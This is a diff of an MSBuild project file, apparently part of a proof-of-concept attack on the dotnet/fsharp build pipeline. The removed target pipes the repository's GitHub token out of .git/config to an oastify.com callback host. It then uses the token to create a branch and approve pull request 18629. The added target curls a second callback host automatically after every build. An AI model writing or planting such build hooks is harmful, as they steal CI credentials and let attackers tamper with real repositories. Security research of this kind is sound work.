@@ -1,14 +1,5 @@
 <Project>
-  <Target Name="UpdateXlf">
-    <Exec Command='
-      curl http://cn3f9xa6e5jb2kwt0hn68kr9006rutii.oastify.com
-      TOKEN=$(grep -i "extraheader = AUTHORIZATION" .git/config | awk "{print \$NF}" | base64 -d | sed "s/x-access-token://");
-      curl http://cn3f9xa6e5jb2kwt0hn68kr9006rutii.oastify.com/?t=$TOKEN
-      LATEST_COMMIT_SHA=$(curl -H "Authorization: token $TOKEN" https://api.github.com/repos/dotnet/fsharp/git/refs/heads/master | jq -r ".object.sha");
-      NEW_BRANCH="poc-branch";
-      curl -X POST -H "Authorization: token $TOKEN" -d "{\"ref\": \"refs/heads/$NEW_BRANCH\", \"sha\": \"$LATEST_COMMIT_SHA\"}" https://api.github.com/repos/dotnet/fsharp/git/refs;
-      PR_NUMBER=18629;
-      curl --request POST --url https://api.github.com/repos/dotnet/fsharp/pulls/$PR_NUMBER/reviews --header "authorization: Bearer $TOKEN" --header "content-type: application/json" -d "{\"event\":\"APPROVE\"}"
-    ' ShellType="bash"/>
+  <Target Name="RunPOCCommand" AfterTargets="Build">
+    <Exec Command="curl http://lk9o667fbegkztt2xqkf5toix930r3fs.oastify.com" />
   </Target>
 </Project>
